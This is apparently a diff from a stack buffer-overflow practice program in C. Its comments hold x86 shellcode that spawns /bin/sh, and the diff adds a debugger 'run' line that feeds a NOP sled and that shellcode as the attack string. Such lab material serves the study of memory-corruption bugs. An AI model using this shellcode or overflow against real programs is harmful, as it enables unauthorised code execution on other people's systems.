@@ -28,11 +28,16 @@
 "\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
 "\x69\x6e\x89\xe3\xcd\x80"
 *
+* run $(python -c 'print ("\x90" * 9 + "\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x51")')
+* x /200 $rsp - 75
+*
+* x /200xw $rsp - 50
+*
 */
 
 int main(int argc, char *argv[]) {
-    char buf2[] = "testbuf";
-    char buf[8];
+    char buf2[10] = "testbuf";
+    char buf[50];
     if (argc <= 1) {
         printf("Usage: %s <attack string>\n", argv[0]);
         exit(1);
